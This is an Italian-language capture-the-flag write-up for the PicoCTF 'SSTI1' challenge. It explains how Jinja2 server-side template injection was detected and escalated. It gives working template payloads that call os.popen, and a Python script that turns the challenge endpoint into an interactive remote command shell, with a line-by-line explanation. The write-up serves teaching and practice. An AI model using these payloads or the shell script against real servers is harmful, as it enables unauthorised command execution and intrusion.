## Risoluzione della sfida SSTI1 di PicoCTF

Si tratta di **Server-Side Template Injection (SSTI)**.  
### **1. Riconoscimento della vulnerabilità**

- Inserendo `{{ 7 * 7 }}` in un campo del form, abbiamo ottenuto `49`.
- Il fatto che `{{ 7 * 7 }}` venga valutato come `49` indica che il server sta interpretando il contenuto inserito come codice template (probabilmente **Jinja2**, usato in Flask, o un motore simile).
### **2. Conferma del motore template**

- Abbiamo testato `{{ 7 * '7' }}` → risultato `7777777`.
- Questo comportamento (moltiplicazione stringa * intero = ripetizione) è tipico di Jinja2, basato su Python.
### **3. Esplorazione dell’ambiente Python via SSTI**

- Payload usato per ottenere la gerarchia delle classi:  
`{{ ''.__class__.__mro__[1].__subclasses__() }}`
- Questo restituisce una lista di tutte le classi disponibili nel sistema, ereditabili da `object`.
### **4. Esecuzione di comandi**

- Con `Popen`, abbiamo eseguito `whoami` per avere le informazioni sull'uetnte:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}`

### **5. Script python**

Con questo script python possiamo lanciare direttamente dei comandi di shell:
```python
import requests
import re

# endpoint che stampa le risposte
main_url = "http://rescued-float.picoctf.net:58153/announce"

while True:
    user_input = input("[]> ")
    data_post = {
        "content": '{{self.__init__.__globals__.__builtins__.__import__("os").popen("' + user_input + '").read()}}'
    }
    
    r = requests.post(main_url, data=data_post)
    response = re.findall(r'align="center">(.*)</h1>', r.text,re.DOTALL)[0]
    print(response)
```

Con il comando `ls -l` possiamo vedere i file della directory tra cui il file *flag* che contiene la flag.

## Spiegazione dello script

Spiegazione dello script, riga per riga, con focus sul **comportamento reale** e sulle **implicazioni di sicurezza**.
## Import

`import requests` 
`import re`
- **requests**: usato per inviare richieste HTTP (POST).
- **re**: usato per estrarre parti della risposta HTML tramite regex.
## Endpoint remoto

`main_url = "http://rescued-float.picoctf.net:58153/announce"`

È l’URL di un servizio web remoto (challenge CTF) che riceve input tramite POST e restituisce una pagina HTML.
## Loop infinito

`while True:`

Il programma entra in una **shell interattiva**: continuerà a chiedere input all’utente finché non viene interrotto manualmente (Ctrl+C).
## Input dell’utente

`user_input = input("[]> ")`

L’utente inserisce un comando (es. `ls`, `cat flag.txt`, `whoami`).
## Payload POST (parte critica)

`data_post = {     "content": '{{self.__init__.__globals__.__builtins__.__import__("os").popen("' + user_input + '").read()}}' }`

Qui avviene **l’exploit vero e proprio**.
### Cosa sta succedendo:
- Il valore di `content` è una **template injection** (tipica di Jinja2).
- La stringa `{{ ... }}` indica che il server **valuta il contenuto come codice Python**.
### Catena di accesso:

`self .__init__ .__globals__ .__builtins__ .__import__("os") .popen(user_input) .read()`

Serve per:
1. Uscire dal contesto del template
2. Accedere ai **builtins Python**
3. Importare il modulo `os`
4. Eseguire un comando di shell (`popen`)
5. Leggerne l’output

In pratica:  
➡️ **qualsiasi comando inserito dall’utente viene eseguito sul server remoto**
## Invio della richiesta

`r = requests.post(main_url, data=data_post)`
Invia il payload al server vulnerabile.
## Estrazione dell’output

`response = re.findall(     r'align="center">(.*)</h1>',     r.text,     re.DOTALL )[0]`

- Il server restituisce una pagina HTML
- L’output del comando è contenuto dentro un tag `<h1 align="center">`
- La regex:
    - cattura **tutto** ciò che c’è tra `>` e `</h1>`
    - `re.DOTALL` permette di includere anche i newline
## Stampa del risultato

`print(response)`
Mostra a schermo l’output del comando eseguito **sul server remoto**.
## Riassunto funzionale

Questo script è una:
### 🔥 **Remote Command Execution shell via Server-Side Template Injection**

- Trasforma un endpoint web vulnerabile in una **shell remota**
- Ogni input dell’utente:
    - viene eseguito dal server
    - l’output viene estratto dall’HTML
    - e stampato localmente
